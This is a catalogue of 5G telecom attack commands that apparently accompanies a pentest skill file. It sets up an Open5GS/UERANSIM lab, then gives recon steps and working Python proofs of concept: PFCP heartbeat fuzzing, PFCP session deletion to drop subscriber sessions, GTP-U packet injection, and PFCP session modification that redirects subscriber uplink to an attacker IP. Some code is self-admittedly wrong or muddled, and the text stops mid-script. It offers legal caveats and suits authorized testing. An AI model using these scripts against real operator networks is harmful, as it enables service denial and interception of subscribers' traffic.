# 5G Telecom Attack Payloads / Command Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 after the per-tool install steps in §0. Engagement types: lab reproduction (Open5GS + UERANSIM / srsRAN), operator-side 5GC pentest, RAN-side IMSI catcher detection, roaming interconnect assessment (SS7/Diameter/SEPP).
>
> Placeholder convention: `<amf-ip>` is the AMF IP, `<smf-ip>` is the SMF IP, `<upf-ip>` is the UPF IP, `<nrf-ip>` is the NRF IP, `<plmn>` is MCC-MNC (e.g. `001-01` for the test network), `<imsi>` is a test IMSI starting with the test MCC 001 (e.g. `001010000000001`), `<suci>` is the SUCI string captured from the air, `<op>` is the operator code, `<key>` is the subscriber K, `<home-pubkey>` is the operator home network public key. Replace before running.
>
> **Legal caveat**: Transmission on licensed cellular bands requires an operator license in every jurisdiction. Passive reception is generally legal (verify per jurisdiction). SS7/Diameter messages against a production operator require explicit roaming-partner authorization and are out of scope for most private 5G engagements. The commands below are for authorized engagements on operator-scoped infrastructure or for lab reproduction on test PLMNs.

---

## 0. Environment Setup

```bash
# ─── Open5GS (5GC: AMF/SMF/UPF/AUSF/UDM/PCF/NRF/NSSF) ───
# Option A: Docker compose (recommended for lab)
git clone https://github.com/open5gs/open5gs /opt/open5gs
cd /opt/open5gs/docker
docker compose up -d
# Verify AMF is listening on SCTP 38412
docker compose ps
ss -tlnp | grep 38412

# Option B: native install (Ubuntu/Debian)
sudo apt update
sudo apt install -y meson ninja-build libtalloc-dev libgnutls28-dev \
  libyaml-cpp-dev libnghttp2-dev libgtpnl-dev libasan6
git clone https://github.com/open5gs/open5gs /opt/open5gs-src
cd /opt/open5gs-src
meson setup build --prefix=/usr/local
ninja -C build
sudo ninja -C build install

# Option C: pre-built packages
sudo add-apt-repository ppa:open5gs/latest
sudo apt update && sudo apt install -y open5gs

# ─── UERANSIM (UE + gNB simulator, pure software) ───
git clone https://github.com/aligungr/UERANSIM /opt/UERANSIM
cd /opt/UERANSIM
sudo apt install -y make g++ libsctp-dev
make -j$(nproc)
./nr-gnb --help
./nr-ue --help

# ─── srsRAN_Project (5G CU/DU gNodeB with SDR hardware) ───
git clone https://github.com/srsran/srsRAN_Project /opt/srsRAN_Project
cd /opt/srsRAN_Project
sudo apt install -y cmake build-essential libfftw3-dev libmbedtls-dev \
  libsctp-dev libyaml-cpp-dev libzmq3-dev libuhd-dev uhd-host
mkdir build && cd build
cmake .. -DENABLE_UHD=ON
make -j$(nproc)
./apps/gnb/srsran_gnb --help

# ─── PacketRusher (5GC load tester / fuzzer in Go) ───
git clone https://github.com/HewlettPackard/PacketRusher /opt/PacketRusher
cd /opt/PacketRusher
go build -o packetrusher ./cmd/packetrusher
./packetrusher -h

# ─── free5GC (alternative open-source 5GC) ───
git clone https://github.com/free5gc/free5gc /opt/free5gc
cd /opt/free5gc
make all

# ─── Wireshark with 5G dissectors ───
sudo apt install -y wireshark tshark
tshark -G protocols | grep -iE 'ngap|pfcp|gtp|nas-5gs|diameter|s1ap'
# Confirm 5G dissectors are present

# ─── scapy (for PFCP/GTP crafting) ───
python3 -m pip install scapy
python3 -c "from scapy.contrib.pfcp import PFCP; print('pfcp ok')"
python3 -c "from scapy.contrib.gtp import GTP_U_Header; print('gtp ok')"

# ─── sctpscan (SCTP port scanner) ───
git clone https://github.com/philippeINSAsly/sctpscan /opt/sctpscan
cd /opt/sctpscan
make

# ─── SDR hardware drivers (for RAN-side work) ───
sudo apt install -y uhd-host gr-uhd gnuradio gr-osmosdr
uhd_usrp_probe  # confirm USRP is detected
# For BladeRF:
sudo apt install -y bladerf bladerf-fpga-hostedxa4
bladeRF-cli -p
# For HackRF:
sudo apt install -y hackrf
hackrf_info
```

```bash
# ─── Validate lab bring-up ───
# Open5GS exposes the WebUI on https://localhost:8080 (default admin/admin — CHANGE)
curl -sk https://localhost:8080/ | head
# AMF SCTP listening?
ss -tlnp 'sport = :38412' || ss -ulnp 'sport = :38412'
# Wait: SCTP uses its own protocol — use `ss -A sctp`
ss -A sctp -tlnp
ss -A sctp -ulnp
# UPF GTP-U?
ss -ulnp 'sport = :2152'
# SMF PFCP?
ss -ulnp 'sport = :8805'
```

```bash
# ─── Spectrum survey tools (for RAN-side / IMSI catcher detection) ───
# gr-SDR / osmocom FFT for visual survey
sudo apt install -y gr-osmosdr osmocom-fft
osmocom_fft --help

# srsRAN cell scanner
sudo apt install -y srsran-scanner  # may need source build
# Alternative: gr-lte / gr-dvbs2 for LTE cell identification

# AIMSICD (Android IMSI catcher detection)
# Open-source Android app: github.com/SecUpwN/Android-IMSI-Catcher-Detector
# Install on rooted Android test device for field detection
```

---

## 1. Lab Setup — Open5GS + UERANSIM Docker Compose

### 1.1 Compose File for Reproducible 5G Lab

```yaml
# /opt/5g-lab/docker-compose.yml
# Canonical 5G SA lab: Open5GS (5GC) + UERANSIM (UE+gNB)
version: "3.8"

services:
  open5gs-amf:
    image: open5gs/amf:v2.7.2
    container_name: amf
    network_mode: host
    volumes:
      - ./amf.yaml:/etc/open5gs/amf.yaml:ro
    restart: unless-stopped

  open5gs-smf:
    image: open5gs/smf:v2.7.2
    container_name: smf
    network_mode: host
    volumes:
      - ./smf.yaml:/etc/open5gs/smf.yaml:ro
    depends_on: [open5gs-amf]
    restart: unless-stopped

  open5gs-upf:
    image: open5gs/upf:v2.7.2
    container_name: upf
    network_mode: host
    cap_add: [NET_ADMIN]
    volumes:
      - ./upf.yaml:/etc/open5gs/upf.yaml:ro
    depends_on: [open5gs-smf]
    restart: unless-stopped

  open5gs-nrf:
    image: open5gs/nrf:v2.7.2
    container_name: nrf
    network_mode: host
    restart: unless-stopped

  open5gs-ausf:
    image: open5gs/ausf:v2.7.2
    container_name: ausf
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  open5gs-udm:
    image: open5gs/udm:v2.7.2
    container_name: udm
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  open5gs-udr:
    image: open5gs/udr:v2.7.2
    container_name: udr
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  open5gs-pcf:
    image: open5gs/pcf:v2.7.2
    container_name: pcf
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  open5gs-nssf:
    image: open5gs/nssf:v2.7.2
    container_name: nssf
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  open5gs-webui:
    image: open5gs/webui:v2.7.2
    container_name: webui
    network_mode: host
    depends_on: [open5gs-nrf]
    restart: unless-stopped

  ueransim-gnb:
    image: ueransim/gnb:latest
    container_name: gnb
    network_mode: host
    volumes:
      - ./gnb.yaml:/etc/ueransim/gnb.yaml:ro
    depends_on: [open5gs-amf]
    restart: unless-stopped

  ueransim-ue:
    image: ueransim/ue:latest
    container_name: ue
    network_mode: host
    cap_add: [NET_ADMIN]
    volumes:
      - ./ue.yaml:/etc/ueransim/ue.yaml:ro
    depends_on: [ueransim-gnb]
    restart: "no"  # UE is one-shot
```

### 1.2 AMF / SMF / UPF YAML Configs

```yaml
# amf.yaml — minimal Open5GS AMF config for lab PLMN 001/01
amf:
  sbi:
    - addr: 127.0.0.5
      port: 7777
  ngap:
    - addr: 127.0.0.5
  metrics:
    - addr: 127.0.0.5
      port: 9090
  guami:
    - plmn_id:
        mcc: 001
        mnc: 01
      amf_id:
        region: 2
        set: 1
  tai:
    - plmn_id:
        mcc: 001
        mnc: 01
      tac: 1
  plmn_support:
    - plmn_id:
        mcc: 001
        mnc: 01
      s_nssai:
        - sst: 1
  security:
    integrity_order: [NIA2, NIA1, NIA0]
    ciphering_order: [NEA2, NEA1, NEA0]
  network_name:
    full: Kali5G-Lab
```

```yaml
# smf.yaml — SMF config with PFCP on N4
smf:
  sbi:
    - addr: 127.0.0.4
      port: 7777
  pfcp:
    - addr: 127.0.0.4
  gtpc:
    - addr: 127.0.0.4
  gtpu:
    - addr: 127.0.0.4
  subnet:
    - addr: 10.45.0.1/16
  dns:
    - 8.8.8.8
    - 8.8.4.4
  mtu: 1400
  p-cscf:
    - 127.0.0.1
```

```yaml
# upf.yaml — UPF with GTP-U on N3
upf:
  pfcp:
    - addr: 127.0.0.7
  gtpu:
    - addr: 127.0.0.7
  subnet:
    - addr: 10.45.0.1/16
    - addr: 2001:db8:cafe::1/48
  metrics:
    - addr: 127.0.0.7
      port: 9090
```

### 1.3 UERANSIM gNB and UE Configs

```yaml
# gnb.yaml — UERANSIM gNB pointing at the lab AMF
mcc: 001
mnc: 01
nci: '0x000000010'
idLength: 32
tac: 1
linkIp: 127.0.0.1
ngapIp: 127.0.0.1
gtpIp: 127.0.0.1

amfConfigs:
  - address: 127.0.0.5
    port: 38412

slices:
  - sst: 1

ignoreStreamIds: true
```

```yaml
# ue.yaml — UERANSIM UE with test IMSI and OPc/K
# IMSI 001010000000001 is the canonical Open5GS test subscriber
supi: 'imsi-001010000000001'
mcc: 001
mnc: 01
key: 465B5CE8B199B49FAA5F0A2EE238A6BC
op: E8ED289DEBA952E42818120E4B82AC25
opType: OPc
amf: '8000'
imei: '356938035643803'
gnbSearchList:
  - 127.0.0.1

# NR-only default session
sessions:
  - type: IPv4
    apn: internet
    slice:
      sst: 1

configuredNssai:
  - sst: 1

default-nssai:
  - sst: 1
```

### 1.4 Bring-Up Verification

```bash
cd /opt/5g-lab
docker compose up -d
docker compose ps
# Wait ~10s for NFs to register with NRF

# Verify NRF knows all NFs
curl -sk https://127.0.0.10:7777/nnrf-nfm/v1/nf-instances | jq '.nfInstance[] | {nfType, fqdn, ipv4Addresses}'

# Verify AMF accepted gNB
docker logs gnb | grep -E 'NGAP|Setup'

# Register UE
docker compose exec ue /UERANSIM/build/nr-ue -c /etc/ueransim/ue.yaml
# Expect: "Connection established for IMSI[...]"
# Expect: PDU session established, IPv4: 10.45.0.x

# Verify the UE got an IP
ip addr show uesimtun0 2>/dev/null || docker exec ue ip addr show uesimtun0

# End-to-end data path test
docker exec ue ping -c 3 1.1.1.1
```

---

## 2. Lab Setup — srsRAN gNodeB + USRP/BladeRF

### 2.1 srsRAN 5G gNB Config (Lab with SDR)

```yaml
# /opt/srsRAN_Project/build/apps/gnb/gnb_rf_b210_tdd_n78.yaml
# srsRAN gNB with USRP B210, TDD, n78 (3.5 GHz)
# REQUIRES: USRP B210/N210/X310, or BladeRF 2.0 micro, or KerberosSDR
# Frequency licensing: 3.5 GHz CBRS in US (Part 96); requires SAS coordination.
# Use the test PLMN 001/01 and low TX power for lab only.

gnb_id: 0x01
gnb_id_bit_length: 22
plmn: "00101"
tac: 1
ran_slice:
  - sst: 1

amf:
  addr: 127.0.0.5
  bind_addr: 127.0.0.1

cell_cfg:
  - band: 78
    channel_bandwidth: 20
    common_scs: 30
    plmn: "00101"
    tac: 1
    ssb_pos_bitmap: "10000000000000000000000000"
    pdsch:
      mcs_table: qam256
    pusch:
      mcs_table: qam256

rf_driver:
  device_driver: uhd
  device_args: "type=b200"
  tx_gain: 70
  rx_gain: 40
  srate: 23.04e6
  lo_offset: 0
  time_alignment_calibration: false

log:
  phy_level: info
  mac_level: info
  rlc_level: info
  pdcp_level: info
  rrc_level: info
  ngap_level: info
  sdap_level: info
  gtpu_level: info
```

### 2.2 SDR Bring-Up Commands

```bash
# Verify SDR hardware is detected
uhd_usrp_probe 2>&1 | head -30
# Expect: B200/B210 detected, serial number, daughter cards

# Calibrate the SDR for 3.5 GHz
uhd_usrp_probe --tree 2>&1 | grep -i 'dboard'

# Launch srsRAN gNB
cd /opt/srsRAN_Project/build
./apps/gnb/srsran_gnb -c gnb_rf_b210_tdd_n78.yaml \
  --amf.addr 127.0.0.5 \
  --log.ngap_level info \
  --rf.device_args 'type=b200,recv_buff_size=100000000'

# In another shell, launch the srsRAN UE (or use UERANSIM in RF sim mode)
./apps/ue/srsran_ue -c ue_rf_b210_tdd_n78.yaml \
  --rf.device_args 'type=b200'
```

### 2.3 Cost-Efficient SDR Options

| SDR | Frequency Range | Bandwidth | Cost (USD) | Notes |
|-----|----------------|------------|------------|-------|
| HackRF One | 1 MHz - 6 GHz | 20 MHz | ~$300 | Half-duplex; capture only for cellular surveys |
| BladeRF 2.0 micro (xA4) | 47 MHz - 6 GHz | 61 MHz | ~$480 | Full-duplex; sufficient for n78 |
| BladeRF 2.0 micro (xA9) | 47 MHz - 6 GHz | 61 MHz | ~$720 | Larger FPGA; recommended for serious work |
| USRP B210 | 70 MHz - 6 GHz | 56 MHz | ~$1,400 | Reference; best supported by srsRAN |
| USRP N310 | 100 MHz - 6 GHz | 100 MHz | ~$3,500 | Lab-grade; gNB-class |
| USRP X310 | 10 MHz - 6 GHz | 120 MHz | ~$4,500 | Production-grade gNB research |

---

## 3. AMF Reconnaissance — NGAP/SCTP Scanning

### 3.1 SCTP Port Scan for AMF (N2)

```bash
# sctpscan for N2 interface (SCTP 38412)
/opt/sctpscan/sctpscan -a <amf-ip> -p 38412 -v
# Output should show: SCTP port 38412 OPEN, INIT-ACK received

# nmap with SCTP support
sudo nmap -sU -sS -p 38412 --script=sctp-init-scan <amf-ip>
sudo nmap -p 38412 --script=sctp-init <amf-ip> --reason

# Identify the SCTP state via lksctp-tools
sudo apt install -y lksctp-tools
sctp_darn -H 0.0.0.0 -P 9999 -h <amf-ip> -p 38412 -s
# Expect SCTP ASSOCIATION established; AMF sends INIT-ACK with its INIT tags
```

### 3.2 NGAP Fingerprinting

```bash
# Once SCTP is up, send a crafted NGSetupRequest and capture the response
python3 - <<'EOF'
from scapy.all import *
from scapy.contrib.sctp import SCTP, SCTPChunkInit
# Build SCTP INIT to AMF
ip = IP(dst='<amf-ip>')
sctp = SCTP(sport=38412, dport=38412) / SCTPChunkInit()
send(ip/sctp)
EOF

# Capture the AMF's NGSetupResponse / NGSetupFailure
sudo tshark -i any -f 'sctp port 38412' -Y ngap -w /tmp/ngap-setup.pcap -c 10
tshark -r /tmp/ngap-setup.pcap -Y ngap -V | head -200
# Extract: PLMN, AMF Region/Set/Pointer, TAC list, slice (S-NSSAI), relative capacity
```

### 3.3 Service-Based Interface (SBI) Enumeration via NRF

```bash
# 5GC SBI is HTTP/2 with JSON. Default port 7777 (Open5GS) or 443 (production).
# First: list all NFs registered with the NRF
curl -sk https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances | jq '.'
# Or via nrf-nfm discovery for a specific NF type
curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?nf-type=AMF" | jq
curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?nf-type=SMF" | jq
curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?nf-type=UPF" | jq

# Extract each NF's SBI endpoints
for nftype in AMF SMF UPF AUSF UDM PCF NSSF NEF NRF; do
  echo "=== $nftype ==="
  curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances?nf-type=$nftype" \
    | jq -r '.nfInstance[].nfServices[]? | "\(.serviceName) -> \(.ipEndPoints[0].ipv4Address):\(.ipEndPoints[0].port)"'
done
```

### 3.4 5GC SBI HTTP/2 Fingerprinting

```bash
# Fingerprint the SBI implementation
curl -sk -v --http2 https://<amf-ip>:7777/namf-comm/v1/ 2>&1 | head -30
curl -sk -v --http2 https://<smf-ip>:7777/nsmf-pdusession/v1/ 2>&1 | head -30

# Identify server header (Open5GS returns "Open5GS", free5GC returns "free5GC", etc.)
curl -sk -I https://<amf-ip>:7777/ 2>&1 | grep -i server
# Known signatures:
#   Open5GS: server: Open5GS v2.7.x
#   free5GC: server: free5GC v3.4.x
#   Amarisoft: server: Amarisoft
#   Mavenir: server: nginx (Mavenir specific X- headers)

# Test for unauthenticated NF status
curl -sk "https://<nrf-ip>:7777/nnrf-nfm/v1/nf-instances" \
  -H "Authorization: Bearer REPLACE_WITH_YOUR_TOKEN" 2>&1 | head -5
# 401 = SBI auth enforced; 200 = NRF is unauthenticated (common in labs/misconfigs)
```

---

## 4. SMF/UPF Probe — PFCP Enumeration

### 4.1 Capture N4 PFCP Traffic

```bash
# Capture all PFCP between SMF and UPF on UDP 8805
sudo tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp.pcap &

# Trigger a registration to generate traffic
docker exec ue /UERANSIM/build/nr-ue -c /etc/ueransim/ue.yaml &
sleep 5

# Analyze captured PFCP
tshark -r /tmp/pfcp.pcap -Y pfcp -T fields \
  -e frame.time_relative -e ip.src -e ip.dst \
  -e pfcp.msg_type_name -e pfcp.seid -e pfcp.f_teid_teid 2>/dev/null \
  | sort -u | head -30
# Output should show: Heartbeat Request/Response, Association Setup,
#   Session Establishment Request (with SEID and TEID)
```

### 4.2 Identify SEID and TEID Space

```bash
# Extract all unique SEIDs in use (Session Endpoint Identifier — per-subscriber-session)
tshark -r /tmp/pfcp.pcap -Y 'pfcp.msg_type == 50' \
  -T fields -e pfcp.seid | sort -u
# Output: a list of 64-bit SEIDs in decimal

# Extract all unique TEIDs (Tunnel Endpoint Identifiers — N3 GTP-U)
tshark -r /tmp/pfcp.pcap -Y 'pfcp.f_teid_teid' \
  -T fields -e pfcp.f_teid_teid -e pfcp.f_teid_v4 2>/dev/null | sort -u
# Output: TEID -> IPv4 of the GTP-U endpoint (gNB or UPF)

# Correlate SEID <-> TEID <-> subscriber IMSI
# (IMSIs come from NGAP/NAS; correlate by timestamp)
tshark -r /tmp/n2.pcap -Y 'nas_5gs.message_type == 0x41' \
  -T fields -e frame.time -e nas_5gs.mobile_identity.imsi
```

### 4.3 PFCP Source Authentication Check

```bash
# Test whether the UPF accepts PFCP from a non-SMF source IP
# (This is the Praetorian class of vulnerability)
python3 - <<'EOF'
import socket, struct
# Craft a minimal PFCP Heartbeat Request from a spoofed source
# (Requires raw socket; run as root)
# Build PFCP v1 Heartbeat Request: msg_type=1
pfcp_header = struct.pack('!BBIB', 0x20, 0x01, 0x00000001, 0x00)
# IE: Node ID (type=60, length=...)
node_id = struct.pack('!BBH', 60, 0, 5) + socket.inet_aton('10.0.0.99')
# IE: Recovery Time Stamp (type=96, length=4)
ts = struct.pack('!BBHI', 96, 0, 4, 1700000000)
msg = pfcp_header + node_id + ts

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(msg, ('<upf-ip>', 8805))
print('Sent PFCP Heartbeat Request from non-SMF source')
EOF

# Capture response on the UPF side
sudo tshark -i any -f 'udp port 8805' -Y pfcp -c 5 -V | grep -A2 'Heartbeat'
# If the UPF responds with a Heartbeat Response: it does NOT validate source IP
# If no response: source IP filtering is enforced (good)
```

---

## 5. PFCP Fuzzing — PacketRusher + Custom PFCP Packets

### 5.1 PacketRusher Baseline

```bash
cd /opt/PacketRusher
cat > config.yml <<EOF
gnodeb:
  controlIF:
    ip: 127.0.0.1
    port: 9487
  dataIF:
    ip: 127.0.0.1
    port: 2152
  plmn:
    mcc: "001"
    mnc: "01"
  tac: "0001"
  gnbId: "000001"
amf:
  ip: <amf-ip>
  port: 38412
ue:
  msin: "0000000001"
  key: REPLACE_WITH_YOUR_KEY
  opc: REPLACE_WITH_YOUR_OPC
  amf: "8000"
  sqn: "00000000"
  dnn: internet
  hplmn:
    mcc: "001"
    mnc: "01"
  snssai:
    sst: 1
    sd: "010203"
EOF

# Run a normal registration to baseline
./packetrusher -c config.yml 2>&1 | head -50

# Run a load test with N UEs
./packetrusher -c config.yml -n 100 2>&1 | head -100
```

### 5.2 PFCP Heartbeat Fuzz

```python
#!/usr/bin/env python3
# pfcp-heartbeat-fuzz.py — Send malformed PFCP Heartbeat Requests
# Author: REPLACE_WITH_YOUR_NAME
# Legal: For use on authorized lab/operator engagements only.
import socket, struct, random, sys, time

target = sys.argv[1] if len(sys.argv) > 1 else '<upf-ip>'
port = 8805

# PFCP Heartbeat Request types — fuzz each variant
def build_hb(seq, ts, node_id_ip='10.0.0.99'):
    # PFCP v1, msg_type=1 (Heartbeat Request)
    # Flags: SE=0 (no SEID for Heartbeat), MP=0
    hdr = struct.pack('!BBIB', 0x20, 0x01, seq, 0)
    # IE Node ID (type 60): FQDN or IPv4
    node_id = struct.pack('!BBH', 60, 0, 5) + socket.inet_aton(node_id_ip)
    # IE Recovery Timestamp (type 96)
    rec_ts = struct.pack('!BBHI', 96, 0, 4, ts)
    return hdr + node_id + rec_ts

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
seq = 1
# Variant 1: well-formed Heartbeat
s.sendto(build_hb(seq, int(time.time())), (target, port)); seq += 1
# Variant 2: truncated header
s.sendto(b'\x20\x01\x00\x00\x00\x01\x00', (target, port)); seq += 1
# Variant 3: malformed Node ID length
hdr = struct.pack('!BBIB', 0x20, 0x01, seq, 0)
bad_node_id = struct.pack('!BBH', 60, 0, 99) + socket.inet_aton('10.0.0.99')
s.sendto(hdr + bad_node_id, (target, port)); seq += 1
# Variant 4: oversized message
hdr = struct.pack('!BBIB', 0x20, 0x01, seq, 0)
s.sendto(hdr + b'\x00' * 65535, (target, port)); seq += 1
# Variant 5: zero timestamp
s.sendto(build_hb(seq, 0), (target, port)); seq += 1
# Variant 6: future timestamp (year 2099)
s.sendto(build_hb(seq, 4070908000), (target, port)); seq += 1

# Capture the UPF's response on the capture host:
#   tshark -i any -f 'udp port 8805' -Y pfcp -c 50 -V | grep -A1 'Heartbeat\|Error'
```

### 5.3 PFCP Session Deletion (Praetorian Class)

```python
#!/usr/bin/env python3
# pfcp-session-deletion-poc.py
# Reproduces the Praetorian (2019) class of PFCP DoS on 5GC UPFs.
# The attack: send a PFCP Session Deletion Request for a known SEID,
# from a source IP that the UPF does not authenticate as the SMF.
# Reference: Praetorian, "5G Standalone Core Vulnerabilities" (2019-2020).
import socket, struct, sys

target_upf = sys.argv[1]
target_seid = int(sys.argv[2], 0)  # pass as 0x... or decimal

# PFCP Session Deletion Request: msg_type=54 (0x36), SE flag set
# Header: version=1, flags=0x21 (SE=1, MP=0), msg_type=54, len=16, SEID, seq, prio/spare
hdr = struct.pack('!BBHQQBBH',
    0x20,                        # version=1, reserved=0
    0x21,                        # flags: SE=1, MP=0
    54,                          # msg_type = Session Deletion Request
    16,                          # length of body after header
    target_seid,                 # SEID
    0x12345678, 0, 0             # seq, prio/spare (packed differently below)
)
# Above pack is wrong for the seq/prio layout — fix:
hdr = struct.pack('!BBH', 0x20, 0x21, 54)  # flags + msg_type
hdr += struct.pack('!H', 16)               # length
hdr += struct.pack('!Q', target_seid)      # SEID (8 bytes because SE=1)
hdr += struct.pack('!I', 0x12345678)       # seq (3 bytes used) + spare
hdr += struct.pack('!BB', 0, 0)            # priority + spare

# No IEs needed for Session Deletion Request (minimum)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(hdr, (target_upf, 8805))
print(f'Sent PFCP Session Deletion Request for SEID {hex(target_seid)} to {target_upf}:8805')

# Capture on the UPF:
#   tshark -i any -f 'udp port 8805' -Y 'pfcp.msg_type == 54 || pfcp.msg_type == 55' -V
# Expected behavior on vulnerable UPF:
#   - UPF returns PFCP Session Deletion Response (msg_type=55, cause=Request accepted)
#   - The subscriber session identified by SEID is torn down
#   - Subscriber loses connectivity; SMF may re-establish or report error
# Expected behavior on hardened UPF:
#   - No response (source IP filtering)
#   - OR PFCP Error response (cause="No established session")
```

### 5.4 AFL++ Harness for PFCP Parser

```bash
# Build AFL++ fuzzing harness for Open5GS PFCP parser
sudo apt install -y afl++

git clone https://github.com/open5gs/open5gs /tmp/open5gs-fuzz
cd /tmp/open5gs-fuzz
mkdir build && cd build
CC=afl-gcc CXX=afl-g++ meson setup .. --prefix=/tmp/open5gs-afl \
  -Doptimization=g -Ddebugg=true -Db_sanitize=address,undefined
ninja -C src/upf/

# Create seed corpus from captured PFCP traffic
mkdir -p /tmp/pfcp-corpus
tshark -r /tmp/pfcp.pcap -Y pfcp -T fields -e data \
  | while read line; do echo -n "$line" | xxd -r -p > /tmp/pfcp-corpus/$(uuid).pcap; done

# Run AFL++ against the PFCP parser function
afl-fuzz -i /tmp/pfcp-corpus -o /tmp/pfcp-findings \
  -- ./src/upf/open5gs-upfd @@
```

---

## 6. GTP-U Tunnel Attacks — Encapsulation Abuse

### 6.1 Capture GTP-U Traffic

```bash
# GTP-U runs on UDP 2152 on the N3 interface (gNB <-> UPF) and N9 (UPF <-> UPF)
sudo tshark -i any -f 'udp port 2152' -Y 'gtp || gtp_u' -w /tmp/gtpu.pcap &

# Trigger UE traffic
docker exec ue ping -c 30 1.1.1.1 &
sleep 8

# Analyze captured GTP-U
tshark -r /tmp/gtpu.pcap -Y gtp -T fields \
  -e ip.src -e ip.dst -e gtp.teid -e gtp.u.message_type -e gtp.u.message_pdu_type \
  | sort -u | head -30
# Output: source/dest + TEID + PDU type for each GTP-U packet
```

### 6.2 Extract TEIDs and Inner Traffic

```bash
# Extract TEIDs in use (these are the per-session handles)
tshark -r /tmp/gtpu.pcap -Y gtp -T fields -e gtp.teid | sort -u

# Decode inner payload of GTP-U packets (the subscriber's actual IP traffic)
tshark -r /tmp/gtpu.pcap -Y 'gtp && gtp.u.message_pdu_type == 0' \
  -T fields -e gtp.teid -e ip.src -e ip.dst -e _ws.col.Info | head -50

# Filter to ICMP inside the tunnel (subscriber pings)
tshark -r /tmp/gtpu.pcap -Y 'icmp' -V | head -100
```

### 6.3 GTP-U Injection PoC (Downlink Spoofing)

```python
#!/usr/bin/env python3
# gtpu-injection-poc.py
# Test whether the UPF forwards GTP-U packets with attacker-injected TEIDs
# from a non-gNB source. Classic 5GC inter-operator or N3-injection bug.
import socket, struct, sys

upf_ip = sys.argv[1]   # e.g. '<upf-ip>'
target_teid = int(sys.argv[2], 0)  # captured TEID, e.g. 0x01000001

# Build a GTP-U packet encapsulating a crafted inner IP packet (TCP SYN)
# GTP-U v1 header: version=1, PT=GTP, E=0, S=0, PN=0, msg_type=255 (G-PDU), length, TEID
def build_gtpu(teid, inner_payload):
    # GTP v1 header (8 bytes minimum)
    flags = 0x30  # version=1 (0b011 << 4? actually 0x30 = version 3 == v1), PT=1, no E/S/PN
    # Correct: version field is 3 bits at MSB: 0b001 = v1 -> flags = (0b001 << 5) | 0b10000 = 0x30
    msg_type = 0xff  # G-PDU
    length = len(inner_payload)
    hdr = struct.pack('!BBHI', flags, msg_type, length, teid)
    return hdr + inner_payload

# Inner IP packet: TCP SYN from 203.0.113.42:9999 to 198.51.100.1:22
# (Use scapy for clean construction)
from scapy.all import IP, TCP, Raw
inner = IP(src='203.0.113.42', dst='198.51.100.1') / TCP(sport=9999, dport=22, flags='S') / Raw(b'GTPU_INJECT_TEST')
inner_bytes = bytes(inner)

gtpu_pkt = build_gtpu(target_teid, inner_bytes)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(gtpu_pkt, (upf_ip, 2152))
print(f'Injected GTP-U packet with TEID {hex(target_teid)} into UPF {upf_ip}')
print('On the subscriber host, run: tcpdump -ni any "tcp and src host 203.0.113.42"')
print('If the injected packet arrives, GTP-U injection is confirmed.')
```

### 6.4 GTP-U Uplink Redirection PoC

```python
#!/usr/bin/env python3
# gtpu-redirect-poc.py
# Test whether a PFCP Session Modification Request can change the UPF's
# far-end TEID for a subscriber session, redirecting their uplink traffic.
# Legal: operator-side engagement only.
import socket, struct, sys

smf_or_upf_ip = sys.argv[1]    # the UPF that should receive the modification
target_seid = int(sys.argv[2], 0)
new_far_end_teid = int(sys.argv[3], 0)  # attacker-controlled endpoint
new_far_end_ip = sys.argv[4]            # attacker IP

# PFCP Session Modification Request: msg_type=52 (0x34), SE=1
hdr = struct.pack('!BBH', 0x20, 0x21, 52)
hdr += struct.pack('!H', 16)
hdr += struct.pack('!Q', target_seid)
hdr += struct.pack('!I', 0xABCDEF01)
hdr += struct.pack('!BB', 0, 0)

# IE: F-TEID (type 21) — new far-end TEID and IP for the downlink to attacker
fteid = struct.pack('!BBH', 21, 0, 9)
fteid_flags = 0x80 | 0x08 | 0x02  # V4=1, TEID present
fteid += struct.pack('!BI', fteid_flags, new_far_end_teid)
fteid += socket.inet_aton(new_far_end_ip)

pkt = hdr + fteid

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(pkt, (smf_or_upf_ip, 8805))
print(f'Sent PFCP Session Modification Request to {smf_or_upf_ip} for SEID {hex(target_seid)}')
print(f'New far-end: {new_far_end_ip}:{hex(new_far_end_teid)}')
print('If the UPF accepts this, subscriber uplink traffic will be redirected to the attacker.')
```

---

## 7. GTP-C Fuzzing — scapy GTP Layer

### 7.1 GTP-C v2 Capture (SMF Control Plane)

```bash
# GTP-C is on UDP 2123 (4G) and is uncommon in 5GC, which uses PFCP+SBI.
# Capture for 4G interworking (N26) on lab with 4G/LTE interoperability.
sudo tshark -i any -f 'udp port 2123' -Y gtp -w /tmp/gtpc.pcap

# Identify GTP-C message types in use
tshark -r /tmp/gtpc.pcap -Y 'gtp && !gtp.u' \
  -T fields -e ip.src -e ip.dst -e gtp.v2.msgtype_name | sort -u
# Expect: Create Session Request, Create Session Response, Delete Session Request,
#   Modify Bearer Request
```

### 7.2 scapy GTP-C v2 Crafting

```python
#!/usr/bin/env python3
# gtpc-craft-poc.py
# Craft GTP-C v2 Create Session Request (4G/LTE) for fuzz testing.
from scapy.all import *
from scapy.contrib.gtp_v2 import GTPHeader, GTPIEIMSI, GTPIE_PAA, IE_IPv4

# 4G S11 (MME <-> SGW) Create Session Request
inner = IP(src='10.0.0.1', dst='10.0.0.2') / UDP(sport=2123, dport=2123)

# GTP-C v2 header
gtp = GTPHeader(version=2, S=1, teid=0x01020304, seq=1, msg_type=32)  # 32 = Create Session Request

# IMSI IE
gtp = gtp / GTPIEIMSI(imsi='001010000000001')
# PAA (PDN Address Allocation)
gtp = gtp / GTPIE_PAA(pdn_type=1, ipv4='10.45.0.5')

pkt = inner / gtp
